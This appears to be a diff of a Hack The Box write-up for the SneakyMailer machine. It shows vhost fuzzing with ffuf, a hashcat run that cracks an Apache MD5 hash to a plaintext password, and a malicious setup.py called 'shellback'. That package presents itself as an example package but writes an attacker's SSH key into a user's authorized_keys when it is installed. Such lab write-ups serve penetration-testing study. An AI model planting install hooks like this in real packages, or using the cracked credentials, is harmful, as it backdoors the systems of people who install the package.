@@ -118,15 +118,7 @@ got lucky trying to bruteforce `Host` header value using
 [ffuf](https://github.com/ffuf/ffuf):
 <pre>
 	kali@kali:~/src/htb/active/SneakyMailer$ ~/bintools/ffuf -w ~/src/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://sneakycorp.htb/ -H "Host: FUZZ.sneakycorp.htb" -mc 200        
-	                                                                                                 
-	        /'___\  /'___\           /'___\                                                          
-	       /\ \__/ /\ \__/  __  __  /\ \__/                                                          
-	       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\                                                         
-	        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/                                                         
-	         \ \_\   \ \_\  \ \____/  \ \_\                                                                                                                                                            
-	          \/_/    \/_/   \/___/    \/_/                                                                                                                                                            
-	                                                                                                 
-	       v1.1.0                                                                                    
+    <SNIP>
 	________________________________________________                                                                                                                                                   
 	                                                                                                                                                                                                   
 	 :: Method           : GET                                                                                                                                                                         
@@ -244,7 +236,6 @@ Was easily cracked with rockyou wordlist:
 	kali@kali:~/src/htb/active/SneakyMailer$ hashcat -m 1600 -a 0 --force '$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/' /usr/share/wordlists/rockyou.txt 
 	…
 	$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
-	                                                 
 	Session..........: hashcat
 	Status...........: Cracked
 	Hash.Type........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
@@ -260,7 +251,6 @@ Was easily cracked with rockyou wordlist:
 	Restore.Point....: 3613696/14344385 (25.19%)
 	Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
 	Candidates.#1....: soul706 -> sotoba6
-	
 	Started: Mon Nov 23 19:20:41 2020
     Stopped: Mon Nov 23 19:26:44 2020
 </pre>
@@ -292,32 +282,31 @@ After a lot of tries and local tests I was able to bundle package that will let
 me in. Do you remember that low is supposed to install and check all the 
 packages from local pypi? The package was made as follows. First create a 
 `setup.py`:
-```python
-	kali@kali:~/src/htb/active/SneakyMailer/sploits/shellback$ cat setup.py 
-	import setuptools
-	
-	
-	try:
-	    with open("/home/low/.ssh/authorized_keys", "a") as keys:
-	        keys.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJQBL1DIJB0EnGZCZ2N1x4bzE5c3g1mmPIsW//CIRVngpvL3xYnhImNEA34uLIvXdyKdK/X9pFymX/xXricUlDjxSAXLZW805K2ZiaxazM5R4R6l+Rwnbg4pTfOBWR40XNP4H+jgncchomSy1vlG5E7TM+LanfauZpGXydnGnAg++dyMdSSKu1VQ2jU1d8KDfeIY9KD7qCvJKWg1QNOfKAmXzUGw29ZwnyE1T572dHsxxw6JLDYjvC2md8L/zbONJzPAsKfZltcxROgg3CPdRSJxYvOL0POOijOD+CBTu1z6MxXZ6CoKMV/IReb/w6zWZ6Pi2AzBNNLBA851kPFK+4EoS51vjtAzgSKLIrORyCWZEEVB+FybMeFNdWG9C0DlS2ODDGbqKrrxGHQNIeUWQ8g3fvk797EwuU1124Bjo7L3u3D655BpXZoElwNiooc3a2l5wwqtjetias4ygvSoBQ5/XmboTaqkkvscx4kAjRPjAM5O2edaFEHt6pv3P/fxc= kali@kali")
-	except:
-	    pass
-	
-	setuptools.setup(
-	    name="shellback",
-	    version="0.0.1",
-	    author="Bad Samaritan",
-	    author_email="paulbyrd@sneakymailer.htb",
-	    description="A small example package",
-	    long_description="lawl",
-	    long_description_content_type="text/markdown",
-	    url="https://github.com/pypa/sampleproject",
-	    packages=setuptools.find_packages(),
-	    classifiers=[
-	        "Programming Language :: Python :: 3",
-	        "License :: OSI Approved :: MIT License",
-	        "Operating System :: OS Independent",
-	    ],
+#!python
+import setuptools
+
+
+try:
+    with open("/home/low/.ssh/authorized_keys", "a") as keys:
+        keys.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJQBL1DIJB0EnGZCZ2N1x4bzE5c3g1mmPIsW//CIRVngpvL3xYnhImNEA34uLIvXdyKdK/X9pFymX/xXricUlDjxSAXLZW805K2ZiaxazM5R4R6l+Rwnbg4pTfOBWR40XNP4H+jgncchomSy1vlG5E7TM+LanfauZpGXydnGnAg++dyMdSSKu1VQ2jU1d8KDfeIY9KD7qCvJKWg1QNOfKAmXzUGw29ZwnyE1T572dHsxxw6JLDYjvC2md8L/zbONJzPAsKfZltcxROgg3CPdRSJxYvOL0POOijOD+CBTu1z6MxXZ6CoKMV/IReb/w6zWZ6Pi2AzBNNLBA851kPFK+4EoS51vjtAzgSKLIrORyCWZEEVB+FybMeFNdWG9C0DlS2ODDGbqKrrxGHQNIeUWQ8g3fvk797EwuU1124Bjo7L3u3D655BpXZoElwNiooc3a2l5wwqtjetias4ygvSoBQ5/XmboTaqkkvscx4kAjRPjAM5O2edaFEHt6pv3P/fxc= kali@kali")
+except:
+    pass
+
+setuptools.setup(
+    name="shellback",
+    version="0.0.1",
+    author="Bad Samaritan",
+    author_email="paulbyrd@sneakymailer.htb",
+    description="A small example package",
+    long_description="lawl",
+    long_description_content_type="text/markdown",
+    url="https://github.com/pypa/sampleproject",
+    packages=setuptools.find_packages(),
+    classifiers=[
+        "Programming Language :: Python :: 3",
+        "License :: OSI Approved :: MIT License",
+        "Operating System :: OS Independent",
+    ],
 )
 ```
 Then bundle it with `python3 setup.py sdist bdist_wheel` and push to remote pypi
